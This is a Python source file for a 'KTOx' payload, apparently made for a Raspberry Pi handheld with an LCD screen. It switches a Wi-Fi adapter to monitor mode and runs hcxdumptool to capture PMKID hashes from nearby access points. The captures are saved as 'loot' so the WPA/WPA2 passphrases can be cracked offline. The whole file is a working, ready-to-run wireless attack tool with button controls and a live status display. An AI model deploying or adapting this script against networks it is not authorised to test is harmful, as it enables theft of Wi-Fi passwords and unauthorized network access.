#!/usr/bin/env python3
"""
KTOx *payload* – **PMKID Capture**
=====================================
This payload uses `hcxdumptool` to capture PMKID (Pairwise Master Key Identifier)
hash values from nearby Wi-Fi access points. PMKID hashes can be cracked
offline to recover the WPA/WPA2 passphrase. This attack is faster than
traditional WPA handshake captures as it only requires a single EAPOL frame.

Features:
- Automatically sets the selected Wi-Fi interface to monitor mode.
- Uses `hcxdumptool` to actively scan for and capture PMKID hashes.
- Displays real-time status, including AP count and PMKID count, on the LCD.
- Saves captured PMKID hashes to a .pcapng file for offline cracking.
- Graceful exit via KEY3 or Ctrl-C, cleaning up `hcxdumptool` processes
  and restoring the Wi-Fi interface to managed mode.

Controls:
- OK: Toggle PMKID capture (Start/Stop).
- KEY3: Exit Payload.
"""
import sys
import os
import time
import signal
import subprocess
import re
import threading
import json
# Prefer installed KTOx first, then repo parent for helpers
if os.path.isdir('/root/KTOx') and '/root/KTOx' not in sys.path:
    sys.path.insert(0, '/root/KTOx')
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..')))
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))) # Add parent directory for monitor_mode_helper
import RPi.GPIO as GPIO
import LCD_Config
import LCD_1in44
from PIL import Image, ImageDraw, ImageFont
from wifi.ktox_integration import (
    get_best_interface,
    get_available_interfaces,
)
import monitor_mode_helper

# Load PINS from KTOx gui_conf.json
PINS: dict[str, int] = {"UP": 6, "DOWN": 19, "LEFT": 5, "RIGHT": 26, "OK": 13, "KEY1": 21, "KEY2": 20, "KEY3": 16}
try:
    import json
    def _find_gui_conf():
        candidates = [
            os.path.join(os.getcwd(), 'gui_conf.json'),
            os.path.join('/root/KTOx', 'gui_conf.json'),
            os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), 'KTOx', 'gui_conf.json'),
        ]
        for sp in sys.path:
            try:
                if sp and os.path.basename(sp) == 'KTOx':
                    candidates.append(os.path.join(sp, 'gui_conf.json'))
            except Exception:
                pass
        for p in candidates:
            if os.path.exists(p):
                return p
        return None
    conf_path = _find_gui_conf()
    if conf_path:
        with open(conf_path, 'r') as f:
            data = json.load(f)
        conf_pins = data.get("PINS", {})
        PINS = {
            "UP": conf_pins.get("KEY_UP_PIN", PINS["UP"]),
            "DOWN": conf_pins.get("KEY_DOWN_PIN", PINS["DOWN"]),
            "LEFT": conf_pins.get("KEY_LEFT_PIN", PINS["LEFT"]),
            "RIGHT": conf_pins.get("KEY_RIGHT_PIN", PINS["RIGHT"]),
            "OK": conf_pins.get("KEY_PRESS_PIN", PINS["OK"]),
            "KEY1": conf_pins.get("KEY1_PIN", PINS["KEY1"]),
            "KEY2": conf_pins.get("KEY2_PIN", PINS["KEY2"]),
            "KEY3": conf_pins.get("KEY3_PIN", PINS["KEY3"]),
        }
except Exception:
    pass
GPIO.setmode(GPIO.BCM)
for pin in PINS.values():
    GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

LCD = LCD_1in44.LCD()
LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
WIDTH, HEIGHT = 128, 128
FONT = ImageFont.load_default()
FONT_TITLE = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
FONT_STATUS = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 10)

KTOX_DIR = '/root/KTOx' if os.path.isdir('/root/KTOx') else os.path.abspath(os.path.join(os.path.dirname(__file__), '..', '..'))
# Prefer wlan1 explicitly if available; otherwise fall back to best WiFi
try:
    interfaces = get_available_interfaces()
    wifi_ifaces = [i for i in interfaces if i.startswith('wlan')]
    if 'wlan1' in wifi_ifaces:
        WIFI_INTERFACE = 'wlan1'
    elif wifi_ifaces:
        WIFI_INTERFACE = wifi_ifaces[0]
    else:
        WIFI_INTERFACE = get_best_interface(prefer_wifi=True)
except Exception:
    WIFI_INTERFACE = get_best_interface(prefer_wifi=True)
ORIGINAL_WIFI_INTERFACE = None
LOOT_DIR = os.path.join(KTOX_DIR, "loot", "PMKID")
running = True
attack_process = None
status_lines = ["Waiting to start..."]
SESSION_LOG = None

def cleanup(*_):
    global running, WIFI_INTERFACE, ORIGINAL_WIFI_INTERFACE, SESSION_LOG
    running = False
    try:
        if attack_process:
            os.kill(attack_process.pid, signal.SIGINT)
    except Exception:
        pass
    # Close session log
    try:
        if SESSION_LOG:
            ts = time.strftime('%Y-%m-%d_%H%M%S')
            with open(SESSION_LOG, 'a') as f:
                f.write(f"END {ts}\n")
    except Exception:
        pass
    # Deactivate monitor
    try:
        if WIFI_INTERFACE:
            monitor_mode_helper.deactivate_monitor_mode(WIFI_INTERFACE)
    except Exception:
        pass

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)



def run_attack():
    global attack_process, status_lines
    
    os.makedirs(LOOT_DIR, exist_ok=True)
    timestamp = time.strftime("%Y-%m-%d_%H%M%S")
    output_file = os.path.join(LOOT_DIR, f"pmkid_{timestamp}.pcapng")
    # Open session log
    global SESSION_LOG
    try:
        SESSION_LOG = os.path.join(LOOT_DIR, f"session_{timestamp}.log")
        with open(SESSION_LOG, 'w') as f:
            f.write(f"START {timestamp} iface={WIFI_INTERFACE} file={os.path.basename(output_file)}\n")
    except Exception:
        SESSION_LOG = None
    
    command = [
        "hcxdumptool",
        "-i", WIFI_INTERFACE,
        "-o", output_file,
        "--enable_status=1"
    ]
    
    attack_process = subprocess.Popen(command, stderr=subprocess.PIPE, text=True)
    
    while running and attack_process.poll() is None:
        line = attack_process.stderr.readline()
        if not line:
            break
        
        parts = line.strip().split(']')
        if len(parts) > 1:
            status_text = parts[1].strip()
            
            ap_count = re.search(r'(\d+)\s+/\s*(\d+)\s+APs', status_text)
            pmkid_count = re.search(r'(\d+)\s+PMKIDs', status_text)
            
            ap_str = f"APs: {ap_count.group(2)}" if ap_count else "APs: N/A"
            pmkid_str = f"PMKIDs: {pmkid_count.group(1)}" if pmkid_count else "PMKIDs: 0"
            
            status_lines = [
                "hcxdumptool running...",
                ap_str,
                pmkid_str,
                f"File: pmkid_{timestamp}.pcapng"
            ]

    if running:
        status_lines = ["hcxdumptool", "crashed or exited.", "Check logs."]
    else:
        status_lines = ["Attack stopped.", f"File saved in:", f"{LOOT_DIR}"]

def draw_ui(status: str):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)

    d.text((5, 5), "PMKID Capture Attack", font=FONT_TITLE, fill="#00FF00")
    d.line([(0, 22), (128, 22)], fill="#00FF00", width=1)

    status_color = "lime" if status == "ACTIVE" else "red"
    d.text((30, 30), status, font=FONT_STATUS, fill=status_color)

    y_pos = 50
    for line in status_lines:
        d.text((5, y_pos), line, font=FONT_STATUS, fill="white")
        y_pos += 12

    d.text((5, 110), "OK=Start/Stop | KEY3=Exit", font=FONT, fill="cyan")
    LCD.LCD_ShowImage(img, 0, 0)

def draw_message(lines, color="yellow"):
    img = Image.new("RGB", (WIDTH, HEIGHT), "black")
    d = ImageDraw.Draw(img)
    font = FONT_TITLE
    y = 40
    message_list = lines if isinstance(lines, list) else [lines]
    for line in message_list:
        bbox = d.textbbox((0, 0), line, font=font)
        w, h = bbox[2] - bbox[0], bbox[3] - bbox[1]
        x = (WIDTH - w) // 2
        d.text((x, y), line, font=font, fill=color)
        y += h + 5
    LCD.LCD_ShowImage(img, 0, 0)

if __name__ == "__main__":
    try:
        is_attacking = False
        
        if subprocess.run("which hcxdumptool", shell=True, capture_output=True).returncode != 0:
            draw_message(["hcxdumptool", "not found!"], "red")
            time.sleep(5)
            raise SystemExit("hcxdumptool not found")

        draw_message(["Preparing", "interface..."])
        ORIGINAL_WIFI_INTERFACE = WIFI_INTERFACE # Store original interface
        activated_interface = monitor_mode_helper.activate_monitor_mode(WIFI_INTERFACE)
        if not activated_interface:
            draw_message(["Monitor Mode FAILED", "Check stderr for details."], "red") # More informative message
            time.sleep(3)
            raise SystemExit("Failed to enable monitor mode")
        WIFI_INTERFACE = activated_interface # Update to the actual monitor interface

        while running:
            draw_ui("ACTIVE" if is_attacking else "STOPPED")
            
            button_pressed = False
            start_wait = time.time()
            while time.time() - start_wait < 1.0 and not button_pressed:
                if GPIO.input(PINS["KEY3"]) == 0:
                    cleanup()
                    break
                
                if GPIO.input(PINS["OK"]) == 0:
                    is_attacking = not is_attacking
                    if is_attacking:
                        status_lines = ["Starting attack..."]
                        threading.Thread(target=run_attack, daemon=True).start()
                    else:
                        try:
                            if attack_process:
                                os.kill(attack_process.pid, signal.SIGINT)
                        except Exception:
                            pass
                        status_lines = ["Stopping attack..."]
                    
                    button_pressed = True
                    time.sleep(0.3)
                    break
                
                time.sleep(0.05)
            
            if not running:
                break

    except (KeyboardInterrupt, SystemExit):
        pass
    except Exception as e:
        print(f"[ERROR] {e}", file=sys.stderr)
        draw_message(["ERROR:", f"{str(e)[:20]}"], "red")
        time.sleep(3)
    finally:
        cleanup()
        draw_message(["Cleaning up..."])
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("PMKID Capture payload finished.")
